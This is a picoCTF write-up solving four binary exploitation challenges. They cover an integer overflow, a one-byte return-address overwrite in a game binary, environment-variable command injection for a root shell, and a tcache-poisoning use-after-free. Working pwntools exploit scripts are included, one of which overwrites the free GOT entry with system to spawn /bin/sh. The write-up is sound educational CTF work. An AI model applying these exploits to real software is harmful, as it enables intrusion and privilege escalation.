<h3> TwoSum </h3>
![image](https://user-images.githubusercontent.com/113513376/228693406-b11eb83e-0421-4224-a4fa-a0ea99145dc0.png)

The source code for the binary is given
![image](https://user-images.githubusercontent.com/113513376/228693499-99eeea03-5a70-4e00-9c52-c4bcc81128ce.png)
![image](https://user-images.githubusercontent.com/113513376/228693651-8c2ad1ac-d6eb-4bff-9591-be1d16c8472c.png)

Here's what this code does

```
This C program prompts the user to enter two positive integers, adds them together, and checks for integer overflow. 
If an integer overflow is detected, the program prints a message and exits.
If no overflow is detected, the program prints a message and exits.
```

The vulnerability thats present here is integer overflow 

Here's the resource on it [acunetix](https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/)

So if we give it `2147483647` and `1` it will cause an integer overflow which will then make the program give the flag

Trying it remotely works
![image](https://user-images.githubusercontent.com/113513376/228694294-510c4fc8-0f6d-4908-82cd-ca7d5a561a35.png)

<h3> BabyGame02 </h3>
![image](https://user-images.githubusercontent.com/113513376/228694432-30c4f2af-6d09-4f81-8e83-9066b495d5ef.png)

After downloading the binary the next thing i check was its file type and protections enabled on the binary
![image](https://user-images.githubusercontent.com/113513376/228694551-248f2666-25c0-4f76-9c0f-2d8b92ea9c92.png)

So we're working with a x86 binary and the only protections enabled is just No Execute (NX)

Using ghidra i'll decompile the binary
![image](https://user-images.githubusercontent.com/113513376/228695541-5d0cdbd0-3878-44c4-aecb-1301f1162d90.png)

This is still the same binary as game01 but the only difference here is that after the user wins the game the win function isn't called

```
  do {
    do {
      iVar1 = getchar();
      local_11 = (char)iVar1;
      move_player(&local_aa8,(int)local_11,local_a9d);
      print_map(local_a9d,&local_aa8);
    } while (local_aa8 != 0x1d);
  } while (local_aa4 != 0x59);
  puts("You win!");
  return 0;
}
```

After i took my time checking out what happens when the program runs and whats happening in the memory i found that at the calling of solve round+47 the value of the stack register esp will be the return address (address $eip is pointing to)
![image](https://user-images.githubusercontent.com/113513376/228696383-6e3238b3-6d9e-48b7-abe9-e28b74047a40.png)
![image](https://user-images.githubusercontent.com/113513376/228696412-73496aae-9fd7-4446-88b3-2c66b141d7f7.png)
![image](https://user-images.githubusercontent.com/113513376/228696435-9f038fd3-bac5-4dba-be46-d02e56ea0bcf.png)

```
$eip   : 0x080495b6  →  <solve_round+47> add esp, 0x10
```

It's means that the eip is pointing to the solve_round function. 

Now here's what happen when the player moves around the game and we check the stack memory addresses

I'll set a breakpoint at address move_player+212
![image](https://user-images.githubusercontent.com/113513376/228696928-d5e4c1d0-fe58-4502-9690-9b4d06d80088.png)
![image](https://user-images.githubusercontent.com/113513376/228696960-e4e7f116-d175-4e6b-a6f5-099f1ba7af46.png)
![image](https://user-images.githubusercontent.com/113513376/228696979-473c7a76-b85a-4a34-bce6-cfc291b0501c.png)
![image](https://user-images.githubusercontent.com/113513376/228697017-09fbc553-0285-473c-8b1a-dd4431ed5b2f.png)
![image](https://user-images.githubusercontent.com/113513376/228697034-33866a6a-b36a-4efd-85dc-597532b5b2b2.png)

So the player character @ is moving around the stack as we move around the game map

If we go out of bound in the game the program will crash because the $eip will try accessing an invalid address 

Another thing we should take note of is that when we move round the memory it's pointers on the stack is being modified

And since the eip is going to be pointing to solve_round whenever we use `p`, and also the solve_round uses the move_player function 

So the eip will point to the esp

The idea now is that can we modify something useful to control the $eip so that we can get it to give us the flag

There's a function given by the game we can allow us change character

So since the player character is moving round the stack, so its overwriting some values on the stack 

But the problem is we can just overwrite the @ structure which only just overwrites the last value of an address of the stack

Now this is more of like a ret2win binary exploitation lets find a way to take control of the execution of the program

Since we can only overwrite the last byte so we need a similar address to the win() function we can overwrite

So after setting a breakpoint at *solve_round+47
![image](https://user-images.githubusercontent.com/113513376/228698849-80e26381-ea46-452d-b49e-d0f25e42f146.png)
![image](https://user-images.githubusercontent.com/113513376/228698863-e78d3c2e-b6ad-45e0-95d6-3b991645da87.png)
![image](https://user-images.githubusercontent.com/113513376/228698913-31d919dd-ded9-44e4-8883-1ee36424ea21.png)

Then on checking the stack, i got an address of the stack that looks very similar to the win() function
![image](https://user-images.githubusercontent.com/113513376/228244859-0de6a39f-1b8f-4983-93fc-a4c36823ef00.png)

We can see the similarity between the stack address 0x08049709 and the win function address 0x0804975d

Only one byte difference that makes it not the same as the win function address

Now next thing is that since while we move round the map and out of bound, the player character is also moving round the stack therefore overwriting bytes on the stack which makes the program crashes, the idea i think is that there's a particular memory on the stack can be overwritten to the win function address.

And for this to occur the character needed to overwrite it is ] which will later turn to 5d in hex

And we know that the l function changes the player character to anything specified. So that means we can change our player character to ]

So basically we can control where this ] ends up as this 0x5d which is now the player so we can try and find the position on the map that is 89 bytes offset from that address that is close to the win function which is the stack address we got earlier

Using a script i made to move round the map and get the offset

```
#!/usr/bin/env python3

from pwn import *

context.log_level = 'warning'

for offset in range(40, 50):
    game = process('./game')

    game.sendline(b'l]')
    game.sendline(b'w'*4)
    game.sendline(b'd'*offset)
    game.sendline(b'wp')

    output = game.recvall()
    if b'testing' in output:
        print(f" offset: {offset}")
        break

    game.close()
```

I already have file flag.txt whose content is `testing{fake_flag}`

Running the script gives the offset to get to the win function
![image](https://user-images.githubusercontent.com/113513376/228699966-296419b0-8d84-4ad4-82a9-d3ae7dfdba94.png)

Now i can get the flag by running 

```
python2 -c "print 'l]' + 'wwww' + 'd'*47 + 'wp'"  | ./game
```

Trying that gets me the flag
![image](https://user-images.githubusercontent.com/113513376/228700159-429ed09f-5165-4484-ac18-3d09d9e152db.png)

But using remotely doesn't work
![image](https://user-images.githubusercontent.com/113513376/228700247-7b4307c0-f73b-4e66-ae88-e23d0989d4ff.png)

After asking in discord people says the binary on the remote is different from the one given (at least its offset)

That made me then make a brute force script on the offset 

```
#!/usr/bin/env python3

from pwn import *
import string

context.log_level = 'warning'

for i in string.printable:
    io = remote('saturn.picoctf.net', 54253)

    io.sendline('l' + i)
    io.sendline(b'w' * 4)
    io.sendline(b'd' * 47)
    io.sendline(b'wp')

    output = io.recvall()
    if b'picoCTF' in output:
        print(f"offset found {i}")
        offset = i 
        break

io = remote('saturn.picoctf.net', 54253)
io.sendline('l' + offset)
io.sendline(b'w' * 4)
io.sendline(b'd' * 47)
io.sendline(b'wp')
io.interactive()
```

Running it gives the flag
![image](https://user-images.githubusercontent.com/113513376/228701598-d6d8e82c-1010-4f54-b9cf-3a142cda80e5.png)
![image](https://user-images.githubusercontent.com/113513376/228701627-29196b3c-db1b-4dc1-ba23-67afc2de4748.png)


<h3> VNE </h3>
![image](https://user-images.githubusercontent.com/113513376/228703179-7349a3e6-6c9a-48e8-b2a5-c6ec27cec495.png)

After connecting to the ssh instance it shows this binary file
![image](https://user-images.githubusercontent.com/113513376/228703286-be5662c0-756e-41eb-87d0-1cf59f7eb357.png)

Running it asks to set the SECRET_DIR environment variable
![image](https://user-images.githubusercontent.com/113513376/228703354-8e7bfe63-8cef-470f-9380-ba86a0ab0a4c.png)

So i set it to /root
![image](https://user-images.githubusercontent.com/113513376/228703452-85bb23a2-602f-4fa4-b551-5b33cf62968c.png)

And after running it, it shows the list of files in root directory

So its likely doing ls then getenv(SECRET_DIR) 

I searched for command injection in environment variable and got [Resource](https://int0x33.medium.com/day-29-set-user-id-environment-variable-injection-path-user-for-linux-priv-esc-ea6c0adc19b8)

Trying it works and we get shell as root
![image](https://user-images.githubusercontent.com/113513376/228703774-247af47a-48e4-43ed-b87c-9aeeff9330a3.png)

<h3> HorseTrack </h3>
![image](https://user-images.githubusercontent.com/113513376/228821375-eda5f850-5ea6-4a90-86dd-426bc072e4f4.png)

After downloading the binary i ran it to get an idea of what it does
![image](https://user-images.githubusercontent.com/113513376/228821545-9ecdfebc-fdee-44b3-be04-ae9ee50aa3ed.png)

From the challenge description we can tell its a heap sort of challenge and its likely UAF since i noticed most pwn heap chall pico ctf brings are based on UAF

After playing with the binary and understanding it, I concluded that for us to exploit this binary we're going to advantage of tcache poisoning with a UAF vulnerability

Here's my exploit mechanism

```
1. add_horse() .. allocates buffer
2. remove_horse() .. frees buffer
3. move_horse() ...
4. And finally tcache poisoning attack to have malloc() return an arbritary pointer to a target memory location. Overwritting the free GOT entry with system with a horse named /bin/sh
```

Here's my solve script

```
#!/usr/bin/env python3

from pwn import *

LOCAL = True  # Set to False to connect to the remote server

if LOCAL:
    r = process('./vuln')
else:
    r = remote('saturn.picoctf.net', 63578)

def edit_horse(idx, data, spot):
    r.sendlineafter(b'Choice: ', b'0')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    r.sendlineafter(b'Enter a string of 16 characters: ', data)
    r.sendlineafter(b'New spot? ', str(spot).encode())

def add_horse(idx, size, data):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    r.sendlineafter(b'Horse name length (16-256)? ', str(size).encode())
    r.sendlineafter(b'characters: ', data)

def free_horse(idx):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())

def race_horse():
    r.sendlineafter(b'Choice: ', b'3')

def exploit():
    # leak heap
    add_horse(0, 0x10, b'A' * 0x10)
    free_horse(0)
    add_horse(0, 0x10, b'\xFF')
    # fill system GOT
    for i in range(1, 5):
        add_horse(i, 0x10, b'X' * 0x10)
    race_horse()
    r.recvuntil(b' ')
    heap_base = u32(r.recvn(10).strip().ljust(4, b'\x00')) << 12
    log.info('heap_base: %#x', heap_base)
    r.recvuntil(b'WINNER:')
    # tcache list
    add_horse(10, 0x18, b'A' * 0x18)
    add_horse(11, 0x18, b'B' * 0x18)
    free_horse(10)
    free_horse(11)
    # change tcache bins to free GOT
    free_got = 0x404010
    edit_horse(11, p64(free_got ^ (heap_base >> 12)) + p64(heap_base + 0x10), 1)
    add_horse(12, 0x18, b'/bin/sh\0' + b'C' * 0x10)
    # change free GOT to system
    ret_gadget = 0x401E48
    system_plt = 0x401090
    payload = flat(
        p64(0),
        p64(system_plt),
        p64(ret_gadget),
    )
    add_horse(13, 0x18, payload)
    free_horse(12)
    r.sendline(b'cat flag.txt')
    r.interactive()

if __name__ == '__main__':
    exploit()

```

Runnig it locally works
![image](https://user-images.githubusercontent.com/113513376/228827277-498951c6-2e84-44b1-a80d-eb0c60de5bb9.png)

Running it remotely works also (set LOCAL=False in script)
![image](https://user-images.githubusercontent.com/113513376/228827711-c78dbee4-90d2-4406-a1be-ada6e8c7f1fc.png)


